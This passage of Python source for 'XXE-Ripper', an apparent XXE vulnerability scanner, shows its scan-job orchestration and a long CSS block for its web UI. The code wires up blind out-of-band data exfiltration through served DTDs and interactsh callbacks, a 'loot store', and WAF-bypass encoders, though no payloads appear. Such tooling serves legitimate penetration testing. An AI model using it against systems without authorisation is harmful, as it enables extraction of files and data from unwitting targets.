                "msg": "oob_timeout ignored: manual OOB mode "
                       "(oob_domain set) never waits for callbacks",
            })
        return 8.0

    if raw is None:
        return 8.0
    try:
        return float(raw)
    except (TypeError, ValueError):
        return 8.0

def _run_scan_job(job: ScanJob):
    cfg = job.config
    _JOBS_BY_THREAD[threading.get_ident()] = job

    if "threads" in cfg:
        try:
            _set_batch_limit(int(cfg["threads"]))
        except (TypeError, ValueError):
            pass

    _acquire_scan_slot()
    job.started_at = time.time()

    try:
        if job.is_cancelled():
            job.status = "cancelled"
            job.emit("status", {"status": "cancelled"})
            return

        job.status = "running"
        job.emit("status", {"status": "running"})

        base_request = None
        if cfg.get("burp_request_raw"):
            try:
                base_request = parse_burp_request_from_bytes(
                    cfg["burp_request_raw"].encode("utf-8")
                )
                cfg["url"] = base_request["url"]
                job.emit("log", {
                    "level": "debug",
                    "msg": f"burp request parsed: {base_request['method']} "
                           f"{base_request['url']}",
                })
            except (ValueError, OSError) as e:
                warn(f"failed to parse Burp request: {e}")
                job.error = f"burp parse failed: {e}"
                job.status = "error"
                return

        custom_payloads = CustomPayloadLoader()
        for p in cfg.get("payloads", []) or []:
            custom_payloads.add_inline(p)
        for pf in cfg.get("payload_files", []) or []:
            try:
                custom_payloads.add_content(
                    pf["content"], pf.get("name", "upload")
                )
            except Exception as e:
                warn(f"failed to add payload file "
                     f"{pf.get('name')!r}: {e}")

        pre_auth_requests: List[Dict] = []
        for idx, par in enumerate(cfg.get("pre_auth_requests_raw") or []):
            raw = par.get("body") if isinstance(par, dict) else par
            if not raw:
                continue
            try:
                pre_auth_requests.append(
                    parse_burp_request_from_bytes(raw.encode("utf-8"))
                )
            except (ValueError, OSError) as e:
                warn(f"failed to parse pre-auth request #{idx + 1}: {e}")

        ctx = ScanContext(
            deadline=time.time() + float(cfg.get("budget", 600.0))
        )
        if job.is_cancelled():
            ctx.cancel()
        job.ctx = ctx

        job_dtd_provider: Optional[Any] = None
        if cfg.get("oob_dtd_dir") and cfg.get("oob_dtd_url_prefix"):
            try:
                job_dtd_provider = FileDTDWriter(
                    cfg["oob_dtd_dir"], cfg["oob_dtd_url_prefix"])
                job.emit("log", {
                    "level": "debug",
                    "msg": f"blind exfiltration: DTD dir "
                           f"{cfg['oob_dtd_dir']} -> "
                           f"{cfg['oob_dtd_url_prefix']}",
                })
            except Exception as e:
                job.emit("log", {
                    "level": "warn",
                    "msg": f"failed to prepare DTD dir: {e!r}",
                })
                job_dtd_provider = None

        if job_dtd_provider is None and cfg.get("oob_dtd_use_webui"):
            webui_url = (cfg.get("oob_dtd_webui_url") or "").strip()
            if webui_url:
                job_dtd_provider = WebUIDTDServer(webui_url)
                job.emit("log", {
                    "level": "debug",
                    "msg": f"blind exfiltration: DTDs served from "
                           f"WebUI at {webui_url}/dtd/<token>.dtd",
                })
            else:
                job.emit("log", {
                    "level": "warn",
                    "msg": "oob_dtd_use_webui set but no public URL "
                           "supplied; exfiltration disabled",
                })

        if job_dtd_provider is not None and not cfg.get("oob_auto"):
            job.emit("log", {
                "level": "warn",
                "msg": "blind exfiltration is configured, but Auto OOB "
                       "mode is off — exfiltrated content will not be "
                       "extracted into the loot store. Use Auto OOB "
                       "mode or read the interactsh terminal manually.",
            })

        oob_manager: Optional[InteractshManager] = None
        oob_domain = cfg.get("oob_domain") or None
        if cfg.get("oob_auto"):
            try:
                oob_manager = _get_or_create_webui_oob_manager()
            except RuntimeError as e:
                job.error = f"OOB auto mode unavailable: {e}"
                job.status = "error"
                job.emit("log", {
                    "level": "error",
                    "msg": f"OOB auto mode unavailable: {e}",
                })
                return
            oob_domain = None
            job.emit("log", {
                "level": "debug",
                "msg": f"OOB auto mode: session domain "
                       f"{oob_manager.domain}",
            })

        result = scan_target(
            url=cfg["url"],
            oob_domain=oob_domain,
            base_request=base_request,
            custom_payloads=custom_payloads,
            cookie_inline=cfg.get("cookie") or None,
            cookie_file=None,
            cookie_content=cfg.get("cookie_content") or None,
            merge_cookies=True,
            unsafe=bool(cfg.get("unsafe")),
            proxy=cfg.get("proxy") or None,
            poll_timeout=float(_resolve_oob_timeout(cfg, job)),
            timing_mode=bool(cfg.get("timing")),
            rate=float(cfg.get("rate", 0.0) or 0.0),
            ctx=ctx,
            timeout=(
                float(cfg.get("timeout_connect", 5.0)),
                float(cfg.get("timeout_read", 15.0)),
            ),
            verify_tls=bool(cfg.get("verify_tls")),
            svg_mode=bool(cfg.get("svg")),
            saml_mode=bool(cfg.get("saml")),
            bypass_waf_encoders=cfg.get("bypass_waf_encoders") or None,
            bypass_waf_include_custom=bool(
                cfg.get("bypass_waf_include_custom")
            ),
            no_fingerprint=bool(cfg.get("no_fingerprint")),
            no_fingerprint_cache=bool(cfg.get("no_fingerprint_cache")),
            full_file_scan=bool(cfg.get("full_file_scan")),
            pre_auth_requests=pre_auth_requests,
            oob_manager=oob_manager,
            dtd_provider=job_dtd_provider,
            event_cb=job.emit,
        )
        job.result = result or {"url": cfg["url"], "findings": []}
        job.status = "cancelled" if ctx.is_cancelled() else "done"
    except Exception as e:
        job.error = f"{type(e).__name__}: {e}"
        job.status = "error"
        dbg("scan job failed:", repr(e))
    finally:
        job.finished_at = time.time()
        _JOBS_BY_THREAD.pop(threading.get_ident(), None)
        _release_scan_slot()

        if isinstance(job_dtd_provider, WebUIDTDServer):
            with _WEBUI_DTDS_LOCK:
                to_drop = [
                    tok for tok, _ in
                    ((t, None) for t in list(_WEBUI_DTDS.keys()))
                ]
                del to_drop
        job.emit("status", {"status": job.status})


WEBUI_HTML = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>XXE-Ripper</title>
<style>
  :root{
    --bg:        #08080a;
    --bg-1:      #0b0b0d;
    --surface:   #121215;
    --surface-2: #17171b;
    --surface-3: #1e1e23;
    --surface-4: #26262c;

    --line:      #202025;
    --line-2:    #2a2a31;
    --line-3:    #3a3a43;

    --fg:        #ececef;
    --fg-2:      #9d9da7;
    --fg-3:      #6b6b76;
    --fg-4:      #48484f;

    --accent:    #6ea8fe;
    --accent-2:  #4b8bf5;
    --accent-bg: rgba(110,168,254,.13);
    --accent-line: rgba(110,168,254,.35);

    --crit:      #f47174;
    --crit-bg:   rgba(244,113,116,.12);
    --high:      #fb923c;
    --high-bg:   rgba(251,146,60,.12);
    --med:       #fbbf24;
    --med-bg:    rgba(251,191,36,.12);
    --low:       #6b6b76;
    --low-bg:    rgba(107,107,118,.10);
    --info:      #4b4b52;
    --info-bg:   rgba(75,75,82,.08);
    --ok:        #4ade80;
    --ok-bg:     rgba(74,222,128,.12);

    --mono: "JetBrains Mono","SF Mono","Cascadia Code",ui-monospace,
            Menlo,Consolas,monospace;
    --sans: "Inter",-apple-system,BlinkMacSystemFont,"Segoe UI",system-ui,
            Roboto,Helvetica,Arial,sans-serif;

    --radius-sm: 4px;
    --radius:    6px;
    --radius-lg: 8px;
    --shadow-md: 0 4px 14px rgba(0,0,0,.35);
    --shadow-lg: 0 16px 48px rgba(0,0,0,.55);
  }

  *,*::before,*::after{box-sizing:border-box}
  html{color-scheme:dark}
  html,body{margin:0;padding:0;height:100%;overflow:hidden;
    background:var(--bg);color:var(--fg);font-family:var(--sans);
    font-size:12.5px;line-height:1.45;
    -webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
  ::selection{background:var(--accent-bg);color:var(--fg)}
  *:focus-visible{outline:1.5px solid var(--accent);outline-offset:1px;
    border-radius:var(--radius-sm)}

  button{font:inherit;color:inherit;background:none;border:0;
    cursor:pointer;padding:0;margin:0}
  input,textarea,select{font:inherit;color:inherit;background:none;
    border:0;outline:none;padding:0;margin:0}

  ::-webkit-scrollbar{width:10px;height:10px}
  ::-webkit-scrollbar-track{background:transparent}
  ::-webkit-scrollbar-thumb{background:var(--line-2);border-radius:5px;
    border:3px solid var(--bg)}
  ::-webkit-scrollbar-thumb:hover{background:var(--line-3)}
  ::-webkit-scrollbar-corner{background:transparent}

  .app{display:flex;flex-direction:column;height:100vh}

  /* Menubar */
  .menubar{
    height:32px;flex-shrink:0;display:flex;align-items:center;
    padding:0 8px;gap:0;
    background:var(--bg-1);border-bottom:1px solid var(--line);
    user-select:none;position:relative;z-index:50;
  }
  .brand{
    display:flex;align-items:center;gap:7px;padding:0 12px 0 6px;
    font-size:11.5px;font-weight:600;letter-spacing:.01em;color:var(--fg);
    margin-right:6px;
  }
  .brand svg{width:14px;height:14px;color:var(--accent)}
  .brand .ver{
    font-family:var(--mono);font-size:9px;font-weight:500;color:var(--fg-3);
    padding:1.5px 5px;border-radius:3px;background:var(--surface-2);
    border:1px solid var(--line);margin-left:2px;
  }
  .menu-trigger{
    position:relative;
    padding:5px 10px;border-radius:var(--radius-sm);font-size:11.5px;
    color:var(--fg-2);transition:background .08s, color .08s;
    cursor:pointer;user-select:none;
  }
  .menu-trigger:hover{background:var(--surface);color:var(--fg)}
  .menu-trigger.open{background:var(--surface-2);color:var(--fg)}

  .menu-dropdown{
    position:absolute;top:calc(100% + 4px);left:0;
    min-width:220px;
    background:var(--surface);
    border:1px solid var(--line-2);
    border-radius:var(--radius);
    box-shadow:var(--shadow-lg);
    padding:4px;
    display:none;
    z-index:200;
  }
  .menu-trigger.open .menu-dropdown{display:block;
    animation:menuIn .1s cubic-bezier(.2,.8,.2,1)}
  @keyframes menuIn{
    from{opacity:0;transform:translateY(-4px)}
    to{opacity:1;transform:none}
  }
  .menu-item-d{
    display:flex;align-items:center;gap:10px;
    padding:7px 10px;border-radius:var(--radius-sm);
    font-size:12px;color:var(--fg-2);cursor:pointer;
    transition:background .06s, color .06s;
    white-space:nowrap;
  }
  .menu-item-d:hover:not(.disabled){background:var(--accent-bg);
    color:var(--fg)}
  .menu-item-d.disabled{opacity:.32;cursor:default}
  .menu-item-d .mn-label{flex:1}
  .menu-item-d .mn-kbd{
    font-family:var(--mono);font-size:9.5px;font-weight:500;
    padding:1.5px 5px;border-radius:3px;
    background:var(--surface-2);border:1px solid var(--line);
    color:var(--fg-4);line-height:1.2;
    margin-left:auto;
  }
  .menu-item-d.checked .mn-label::before{
    content:"✓";color:var(--accent);margin-right:6px;
    font-size:11px;
  }
  .menu-item-d:not(.checked) .mn-label.has-check::before{
    content:"";display:inline-block;width:11px;
    margin-right:6px;
  }
  .menu-sep{
    height:1px;background:var(--line);margin:4px 6px;
  }

  .menubar-spacer{flex:1}
  .menubar-status{
    display:flex;align-items:center;gap:6px;padding:0 10px;
    font-family:var(--mono);font-size:10.5px;color:var(--fg-3);
  }
  .menubar-status .dot{width:6px;height:6px;border-radius:50%;
    background:var(--ok);box-shadow:0 0 0 2px rgba(74,222,128,.15);
    transition:all .2s}
  .menubar-status .dot.busy{background:var(--accent);
    box-shadow:0 0 0 2px rgba(110,168,254,.2);
    animation:pulse 1.4s ease-in-out infinite}
  .menubar-status .dot.offline{background:var(--crit);
    box-shadow:0 0 0 2px rgba(244,113,116,.2)}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}

  .kbd-hint{
    display:flex;align-items:center;gap:6px;padding:0 8px 0 12px;
    border-left:1px solid var(--line);margin-left:6px;
  }
  .kbd{
    font-family:var(--mono);font-size:9.5px;font-weight:500;
    padding:1.5px 5px;border-radius:3px;
    background:var(--surface-2);border:1px solid var(--line);
    color:var(--fg-3);line-height:1.2;
  }

  /* Toolbar */
  .toolbar{
    height:40px;flex-shrink:0;display:flex;align-items:center;
    gap:2px;padding:0 10px;background:var(--bg-1);
    border-bottom:1px solid var(--line);
  }
  .tb-btn{
    display:inline-flex;align-items:center;gap:6px;
    padding:6px 10px;border-radius:var(--radius-sm);
    font-size:12px;font-weight:500;color:var(--fg-2);
    transition:background .08s, color .08s, border-color .08s;
    white-space:nowrap;
  }
  .tb-btn:hover:not(:disabled){background:var(--surface);color:var(--fg)}
  .tb-btn:active:not(:disabled){background:var(--surface-2)}
  .tb-btn:disabled{opacity:.3;cursor:default}
  .tb-btn.primary{
    background:var(--accent-2);color:#fff;
    padding:6px 12px;
  }
  .tb-btn.primary:hover:not(:disabled){
    background:var(--accent);color:#fff;
  }
  .tb-btn.bordered{border:1px solid var(--line-2)}
  .tb-btn svg{width:12px;height:12px;flex-shrink:0}
  .tb-sep{width:1px;height:18px;background:var(--line);margin:0 6px}
  .toolbar-spacer{flex:1}

  .tb-search{
    display:inline-flex;align-items:center;gap:6px;
    height:26px;padding:0 9px;border-radius:var(--radius-sm);
    background:var(--surface);border:1px solid var(--line);
    transition:all .1s;min-width:200px;
  }
  .tb-search:focus-within{
    border-color:var(--accent-line);background:var(--surface-2);
    box-shadow:0 0 0 3px var(--accent-bg);
  }
  .tb-search svg{width:11px;height:11px;color:var(--fg-3);flex-shrink:0}
  .tb-search input{flex:1;font-size:11.5px;min-width:0}
  .tb-search input::placeholder{color:var(--fg-4)}

  .tb-icon{
    display:inline-flex;align-items:center;justify-content:center;
    width:26px;height:26px;border-radius:var(--radius-sm);
    color:var(--fg-3);transition:all .08s;
  }
  .tb-icon:hover{background:var(--surface);color:var(--fg-2)}
  .tb-icon.on{color:var(--accent);background:var(--accent-bg)}
  .tb-icon svg{width:13px;height:13px}

  .sev-toggles{display:flex;gap:1px;align-items:center;padding:0 6px}
  .sev-btn{
    font-family:var(--mono);font-size:10px;font-weight:600;
    width:20px;height:20px;border-radius:3px;
    display:inline-flex;align-items:center;justify-content:center;
    color:var(--fg-4);transition:all .08s;letter-spacing:.03em;
  }
  .sev-btn:hover{background:var(--surface)}
  .sev-btn.on[data-sev="CRITICAL"]{color:var(--crit);background:var(--crit-bg)}
  .sev-btn.on[data-sev="HIGH"]{color:var(--high);background:var(--high-bg)}
  .sev-btn.on[data-sev="MEDIUM"]{color:var(--med);background:var(--med-bg)}
  .sev-btn.on[data-sev="LOW"]{color:var(--fg-2);background:var(--surface-3)}
  .sev-btn.on[data-sev="INFO"]{color:var(--fg-3);background:var(--surface-3)}

  /* Context bar */
  .contextbar{
    height:42px;flex-shrink:0;display:flex;align-items:center;
    gap:14px;padding:0 12px;
    background:var(--surface);
    border-bottom:1px solid var(--line-2);
  }
  .ctx-status{display:flex;align-items:center;gap:8px;flex-shrink:0}
  .ctx-dot{
    width:7px;height:7px;border-radius:50%;background:var(--fg-4);
    flex-shrink:0;
  }
  .ctx-dot.running{background:var(--accent);
    box-shadow:0 0 0 3px var(--accent-bg);
    animation:pulse 1.4s ease-in-out infinite}
  .ctx-dot.done{background:var(--ok);
    box-shadow:0 0 0 3px rgba(74,222,128,.15)}
  .ctx-dot.error{background:var(--crit);
    box-shadow:0 0 0 3px rgba(244,113,116,.15)}
  .ctx-dot.cancelled{background:var(--fg-3)}
  .ctx-url{
    font-family:var(--mono);font-size:12px;color:var(--fg);
    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
    max-width:360px;letter-spacing:-.01em;
  }
  .ctx-pill{
    font-family:var(--mono);font-size:9.5px;font-weight:600;
    text-transform:uppercase;letter-spacing:.06em;
    padding:2px 7px;border-radius:3px;
    background:var(--surface-3);color:var(--fg-3);
  }
  .ctx-pill.running{color:var(--accent);background:var(--accent-bg)}
  .ctx-pill.done{color:var(--ok);background:var(--ok-bg)}
  .ctx-pill.error{color:var(--crit);background:var(--crit-bg)}
  .ctx-pill.cancelled{color:var(--fg-3);background:var(--surface-3)}
  .ctx-pill.queued{color:var(--fg-3);background:var(--surface-3)}

  .ctx-spacer{flex:1}

  /* Workbench */
  .workbench{
    flex:1;min-height:0;overflow:hidden;
    display:grid;
    grid-template-columns:240px minmax(0,1fr) minmax(0,440px);
  }
  .pane{
    display:flex;flex-direction:column;overflow:hidden;background:var(--bg);
    min-width:0;min-height:0;
  }
  .pane + .pane{border-left:1px solid var(--line)}
  .pane-header{
    height:28px;flex-shrink:0;display:flex;align-items:center;
    padding:0 12px;background:var(--bg-1);
    border-bottom:1px solid var(--line);
    font-size:10px;font-weight:600;letter-spacing:.09em;
    text-transform:uppercase;color:var(--fg-3);
    user-select:none;gap:8px;
  }
  .pane-header .count{
    margin-left:auto;font-family:var(--mono);font-size:10px;
    color:var(--fg-4);font-weight:400;letter-spacing:0;
    text-transform:none;
  }
  .pane-body{flex:1;overflow-y:auto;overflow-x:hidden;
    min-height:0}

  .pane-tabs{
    display:flex;align-items:center;height:28px;flex-shrink:0;
    background:var(--bg-1);border-bottom:1px solid var(--line);
    padding:0 6px;gap:0;overflow-x:auto;
  }
  .ptab{
    height:28px;padding:0 10px;font-size:11.5px;color:var(--fg-3);
    display:flex;align-items:center;gap:6px;
    border-bottom:1.5px solid transparent;
    transition:all .1s;white-space:nowrap;
    margin-bottom:-1px;
  }
  .ptab:hover{color:var(--fg-2)}
  .ptab.active{color:var(--fg);border-bottom-color:var(--accent)}
  .ptab-count{
    font-family:var(--mono);font-size:9.5px;font-weight:500;
    padding:1px 5px;border-radius:8px;
    background:var(--surface-2);color:var(--fg-4);
    min-width:18px;text-align:center;
  }
  .ptab.active .ptab-count{background:var(--accent-bg);color:var(--accent)}

  .target{
    display:block;padding:10px 12px 11px;
    border-bottom:1px solid var(--line);
    cursor:pointer;transition:background .08s;
    position:relative;
  }
  .target:hover{background:var(--surface)}
  .target.selected{background:var(--surface-2)}
  .target.selected::before{
    content:"";position:absolute;left:0;top:0;bottom:0;width:2px;
    background:var(--accent);
  }
  .target-row1{
    display:flex;align-items:center;gap:8px;margin-bottom:6px;
    min-width:0;
  }
  .target-dot{
    width:6px;height:6px;border-radius:50%;flex-shrink:0;
    background:var(--fg-4);
  }
  .target-dot.running{
    background:var(--accent);
    box-shadow:0 0 0 2.5px var(--accent-bg);
    animation:pulse 1.4s ease-in-out infinite;
  }
  .target-dot.done{background:var(--ok)}
  .target-dot.error{background:var(--crit)}
  .target-dot.cancelled{background:var(--fg-3)}
  .target-url{
    font-family:var(--mono);font-size:11px;color:var(--fg);
    overflow:hidden;text-overflow:ellipsis;white-space:nowrap;
    flex:1;letter-spacing:-.01em;
  }
  .target-row2{
    display:flex;align-items:center;gap:8px;flex-wrap:wrap;
    padding-left:14px;
    font-size:10px;font-family:var(--mono);color:var(--fg-3);
  }
  .target-row2 .num{color:var(--fg-2);font-weight:500}
  .target-row2 .crit{color:var(--crit)}
  .target-row2 .high{color:var(--high)}
  .target-row2 .stat{
    display:inline-flex;align-items:center;gap:3px;
  }

  table.findings{
    width:100%;border-collapse:collapse;font-size:11.5px;
    table-layout:fixed;
  }
  table.findings thead{position:sticky;top:0;z-index:2}
  table.findings th{
    text-align:left;font-weight:500;font-size:10px;
    letter-spacing:.06em;text-transform:uppercase;
    color:var(--fg-3);padding:7px 10px;
    border-bottom:1px solid var(--line);
    background:var(--bg-1);
    user-select:none;white-space:nowrap;
  }
  table.findings th.sortable{cursor:pointer;transition:color .1s}
  table.findings th.sortable:hover{color:var(--fg-2)}
  table.findings th.sorted{color:var(--fg)}
  table.findings th .arrow{
    display:inline-block;margin-left:4px;font-size:8px;
    color:var(--accent);line-height:1;
  }
  table.findings td{
    padding:7px 10px;border-bottom:1px solid var(--line);
    vertical-align:top;overflow:hidden;
    text-overflow:ellipsis;white-space:nowrap;
    font-variant-numeric:tabular-nums;
  }
  table.findings tbody tr{cursor:pointer;transition:background .06s}
  table.findings tbody tr:hover{background:var(--surface)}
  table.findings tbody tr.selected{background:var(--accent-bg)}
  table.findings tbody tr.selected td:first-child{
    box-shadow:inset 2px 0 0 var(--accent);
  }
  table.findings tr.sev-row-CRITICAL td:first-child{
    box-shadow:inset 2px 0 0 var(--crit)}
  table.findings tr.sev-row-HIGH td:first-child{
    box-shadow:inset 2px 0 0 var(--high)}
  table.findings tr.sev-row-MEDIUM td:first-child{
    box-shadow:inset 2px 0 0 var(--med)}
  table.findings tr.sev-row-LOW td:first-child{
    box-shadow:inset 2px 0 0 var(--low)}
  table.findings tr.sev-row-INFO td:first-child{
    box-shadow:inset 2px 0 0 var(--info)}
  table.findings tr.selected td:first-child{
    box-shadow:inset 2px 0 0 var(--accent) !important}

  .sev-label{
    display:inline-block;font-family:var(--mono);font-size:9.5px;
    font-weight:600;letter-spacing:.05em;text-transform:uppercase;
    padding:2px 6px;border-radius:3px;line-height:1.15;
  }
  .sev-label.CRITICAL{color:var(--crit);background:var(--crit-bg)}
  .sev-label.HIGH{color:var(--high);background:var(--high-bg)}
  .sev-label.MEDIUM{color:var(--med);background:var(--med-bg)}
  .sev-label.LOW{color:var(--fg-2);background:var(--surface-3)}
  .sev-label.INFO{color:var(--fg-3);background:var(--surface-2)}

  .fid{
    font-family:var(--mono);font-size:10.5px;color:var(--fg-2);
    letter-spacing:-.01em;
  }
  .fid-cwe{
    font-family:var(--mono);font-size:9.5px;color:var(--fg-4);
    margin-left:6px;
  }
  .ftitle{color:var(--fg);font-size:11.5px}
  .fconf{
    font-family:var(--mono);font-size:10.5px;
    color:var(--fg-3);text-align:right;
  }

  .empty{
    display:flex;flex-direction:column;align-items:center;
    justify-content:center;height:100%;
    gap:10px;padding:40px 24px;text-align:center;
    color:var(--fg-4);font-size:11.5px;line-height:1.55;
  }
  .empty svg{width:32px;height:32px;opacity:.35;margin-bottom:2px}
  .empty strong{color:var(--fg-3);font-weight:500;font-size:12px}
  .empty .hint{
    font-family:var(--mono);font-size:10.5px;color:var(--fg-4);
    margin-top:2px;
  }

  .skel-row td{padding:9px 10px}
  .skel-row .bar{
    height:9px;border-radius:3px;background:var(--surface-2);
    animation:skelpulse 1.6s ease-in-out infinite;
  }
  .skel-row td:nth-child(1) .bar{width:70%}
  .skel-row td:nth-child(2) .bar{width:45%}
  .skel-row td:nth-child(3) .bar{width:85%}
  .skel-row td:nth-child(4) .bar{width:30%}
  @keyframes skelpulse{0%,100%{opacity:.45}50%{opacity:.9}}

  .insp-tabs{
    display:flex;align-items:center;height:28px;flex-shrink:0;
    background:var(--bg-1);border-bottom:1px solid var(--line);
    padding:0 6px;gap:0;
  }
  .itab{
    height:28px;padding:0 10px;font-size:11px;color:var(--fg-3);
    display:flex;align-items:center;gap:6px;
    border-bottom:1.5px solid transparent;
    transition:all .1s;margin-bottom:-1px;
  }
  .itab:hover{color:var(--fg-2)}
  .itab.active{color:var(--fg);border-bottom-color:var(--accent)}

  .insp-body{flex:1;overflow-y:auto;padding:16px 18px;min-height:0}

  .insp-hero{
    display:flex;align-items:center;gap:8px;margin-bottom:10px;
    flex-wrap:wrap;
  }
  .insp-title{
    font-size:14px;font-weight:600;line-height:1.35;
    color:var(--fg);margin:0 0 6px;word-break:break-word;
    letter-spacing:-.005em;
  }
  .insp-meta{
    display:flex;flex-wrap:wrap;gap:4px;margin-bottom:16px;
  }
  .insp-chip{
    font-family:var(--mono);font-size:10px;font-weight:500;
    padding:2px 7px;border-radius:3px;
    background:var(--surface);color:var(--fg-3);
    border:1px solid var(--line);
  }
  .insp-chip.ok{
    color:var(--ok);border-color:rgba(74,222,128,.25);
    background:var(--ok-bg);
  }
  .insp-chip.cwe{
    color:#c9a3f5;border-color:rgba(201,163,245,.22);
    background:rgba(201,163,245,.08);
  }
  .insp-chip.sev-CRITICAL{
    color:var(--crit);border-color:rgba(244,113,116,.3);
    background:var(--crit-bg);
  }
  .insp-chip.sev-HIGH{
    color:var(--high);border-color:rgba(251,146,60,.3);
    background:var(--high-bg);
  }
  .insp-chip.sev-MEDIUM{
    color:var(--med);border-color:rgba(251,191,36,.3);
    background:var(--med-bg);
  }

  .insp-section{margin-bottom:18px}
  .insp-section:last-child{margin-bottom:0}
  .insp-label{
    font-size:10px;font-weight:600;letter-spacing:.09em;
    text-transform:uppercase;color:var(--fg-3);
    margin:0 0 8px;display:flex;align-items:center;gap:6px;
  }
  .insp-label .spacer{flex:1}
  .insp-label .copy-btn{opacity:0}
  .insp-section:hover .insp-label .copy-btn{opacity:1}

  .insp-p{
    font-size:12px;color:var(--fg-2);line-height:1.6;margin:0;
    word-break:break-word;
  }

  .insp-reasons{
    list-style:none;margin:0;padding:0;
    border:1px solid var(--line);border-radius:var(--radius);
    background:var(--bg-1);overflow:hidden;
  }
  .insp-reasons li{
    font-size:11.5px;padding:8px 12px 8px 26px;
    color:var(--fg-2);line-height:1.55;position:relative;
    border-bottom:1px solid var(--line);
  }
  .insp-reasons li:last-child{border-bottom:0}
  .insp-reasons li::before{
    content:"";position:absolute;left:11px;top:14px;
    width:5px;height:5px;border-radius:50%;background:var(--ok);
  }

  pre.code{
    margin:0;padding:10px 12px;
    font-family:var(--mono);font-size:10.5px;line-height:1.6;
    background:var(--bg-1);border:1px solid var(--line);
    border-radius:var(--radius);overflow-x:auto;
    color:var(--fg-2);white-space:pre;
  }
  pre.code.kv{
    display:grid;
    grid-template-columns:minmax(0,auto) minmax(0,1fr);
    column-gap:16px;row-gap:3px;
    padding:12px 14px;
  }
  pre.code.kv .k{color:var(--fg-3)}
  pre.code.kv .v{color:var(--fg-2);word-break:break-word;
    white-space:pre-wrap}

  .copy-btn{
    display:inline-flex;align-items:center;justify-content:center;
    width:20px;height:20px;border-radius:3px;
    color:var(--fg-4);transition:all .1s;
    background:transparent;border:0;cursor:pointer;
  }
  .copy-btn:hover{background:var(--surface-2);color:var(--fg-2)}
  .copy-btn.copied{color:var(--ok);background:var(--ok-bg)}
  .copy-btn svg{width:11px;height:11px}

  .statusbar{
    height:24px;flex-shrink:0;
    display:flex;align-items:center;gap:0;
    padding:0 12px;
    background:var(--bg-1);border-top:1px solid var(--line);
    font-family:var(--mono);font-size:10.5px;color:var(--fg-3);
    user-select:none;
  }
  .sb-item{
    display:flex;align-items:center;gap:5px;
    padding:0 12px;height:100%;
    border-right:1px solid var(--line);
  }
  .sb-item:first-child{padding-left:0}
  .sb-item b{color:var(--fg-2);font-weight:500}
  .sb-item.crit b{color:var(--crit)}
  .sb-item.high b{color:var(--high)}
  .sb-item.phase{color:var(--accent);border-right:0}
  .sb-item.phase b{color:var(--accent)}
  .statusbar-spacer{flex:1}

  .cmdk-backdrop{
    position:fixed;inset:0;background:rgba(0,0,0,.5);
    display:none;align-items:flex-start;justify-content:center;
    z-index:100;padding-top:14vh;
    backdrop-filter:blur(3px);
  }
  .cmdk-backdrop.open{display:flex;animation:fadeIn .12s ease}
  @keyframes fadeIn{from{opacity:0}to{opacity:1}}
  .cmdk{
    width:560px;max-width:90vw;
    background:var(--surface);
    border:1px solid var(--line-2);border-radius:var(--radius-lg);
    box-shadow:var(--shadow-lg);overflow:hidden;
    animation:cmdkIn .14s cubic-bezier(.2,.8,.2,1);
  }
  @keyframes cmdkIn{
    from{opacity:0;transform:translateY(-6px) scale(.98)}
    to{opacity:1;transform:none}
  }
  .cmdk-input{
    display:flex;align-items:center;gap:10px;
    padding:13px 16px;border-bottom:1px solid var(--line);
  }
  .cmdk-input svg{width:14px;height:14px;color:var(--fg-3);flex-shrink:0}
  .cmdk-input input{flex:1;font-size:14px;color:var(--fg)}
  .cmdk-input input::placeholder{color:var(--fg-4)}
  .cmdk-list{
    max-height:360px;overflow-y:auto;padding:5px;
  }
  .cmdk-item{
    display:flex;align-items:center;gap:10px;
    padding:8px 10px;border-radius:var(--radius-sm);
    font-size:12.5px;color:var(--fg-2);cursor:pointer;
    transition:background .06s;
  }
  .cmdk-item:hover:not(.disabled),.cmdk-item.active:not(.disabled){
    background:var(--accent-bg);color:var(--fg);
  }
  .cmdk-item.disabled{opacity:.4;cursor:default}
  .cmdk-item svg{
    width:13px;height:13px;color:var(--fg-3);flex-shrink:0;
  }
  .cmdk-item.active svg{color:var(--accent)}
  .cmdk-item .label{flex:1}
  .cmdk-item .desc{
    font-size:10.5px;color:var(--fg-4);
    font-family:var(--mono);
  }
  .cmdk-item .pill-sm{
    font-family:var(--mono);font-size:9px;font-weight:600;
    padding:1px 6px;border-radius:3px;text-transform:uppercase;
    letter-spacing:.05em;
  }
  .cmdk-empty{
    padding:30px;text-align:center;font-size:12px;color:var(--fg-4);
  }

  .drawer-backdrop{
    position:fixed;inset:0;background:rgba(0,0,0,.5);
    display:none;z-index:80;backdrop-filter:blur(3px);
  }
  .drawer-backdrop.open{display:block;animation:fadeIn .14s ease}
  .drawer{
    position:absolute;top:0;right:0;bottom:0;
    width:500px;max-width:96vw;
    background:var(--bg-1);border-left:1px solid var(--line-2);
    box-shadow:var(--shadow-lg);
    display:flex;flex-direction:column;
    transform:translateX(100%);
    transition:transform .2s cubic-bezier(.2,.8,.2,1);
  }
  .drawer-backdrop.open .drawer{transform:translateX(0)}
  .drawer-head{
    height:44px;flex-shrink:0;
    display:flex;align-items:center;gap:10px;
    padding:0 18px;border-bottom:1px solid var(--line);
    font-size:13px;font-weight:600;
  }
  .drawer-head svg.lead{
    width:14px;height:14px;color:var(--accent);flex-shrink:0;
  }
  .drawer-head .close{
    margin-left:auto;width:26px;height:26px;
    display:flex;align-items:center;justify-content:center;
    border-radius:var(--radius-sm);color:var(--fg-3);
    transition:all .08s;
  }
  .drawer-head .close:hover{background:var(--surface-2);color:var(--fg)}
  .drawer-head .close svg{width:13px;height:13px}
  .drawer-body{
    flex:1;overflow-y:auto;padding:18px 20px;min-height:0;
  }
  .drawer-foot{
    flex-shrink:0;padding:14px 20px;border-top:1px solid var(--line);
    display:flex;gap:8px;justify-content:flex-end;
    background:var(--bg-1);
  }

  .f-section{
    display:flex;align-items:center;gap:10px;
    font-size:10px;font-weight:600;letter-spacing:.09em;
    text-transform:uppercase;color:var(--fg-3);
    margin:22px 0 10px;
  }
  .f-section:first-child{margin-top:0}
  .f-section::after{
    content:"";flex:1;height:1px;
    background:linear-gradient(90deg,var(--line) 0%,transparent 100%);
  }
  .f-group{margin-bottom:14px}
  .f-label{
    display:flex;align-items:baseline;gap:6px;
    font-size:11px;font-weight:500;color:var(--fg-2);
    margin-bottom:6px;letter-spacing:.005em;
  }
